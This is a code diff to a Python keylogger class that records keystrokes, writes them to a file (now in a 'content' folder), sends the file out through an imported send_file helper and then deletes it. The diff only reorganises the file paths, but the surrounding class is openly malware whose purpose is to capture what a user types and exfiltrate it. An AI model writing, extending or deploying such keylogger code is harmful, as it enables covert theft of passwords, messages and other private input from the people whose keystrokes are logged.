@@ -2,6 +2,11 @@ import time
 import keyboard
 from send_file import send_file
 from removefile import removefile
+import os
+
+FOLDER_NAME = "content"
+FILE_NAME = "keystrokes.txt"
+FILE_PATH = os.path.join(FOLDER_NAME, FILE_NAME)
 
 class keylogger:
     def __init__(self, duration):
@@ -26,14 +31,17 @@ class keylogger:
             self.keys.append(key.name)
 
     def save(self):
+        if not os.path.exists(FOLDER_NAME):
+            os.makedirs(FOLDER_NAME)
+
         print("Saving keystrokes to file...")
-        with open("keystrokes.txt", "w") as f:
+        with open(FILE_PATH, "w") as f:
             f.write("".join(self.keys))
         print("Keystrokes saved to file.")
 
     def sendfile(self):
-        send_file("keystrokes.txt")
+        send_file(FILE_PATH)
 
     def remove(self):
-        removefile("keystrokes.txt")
+        removefile(FILE_PATH)
 
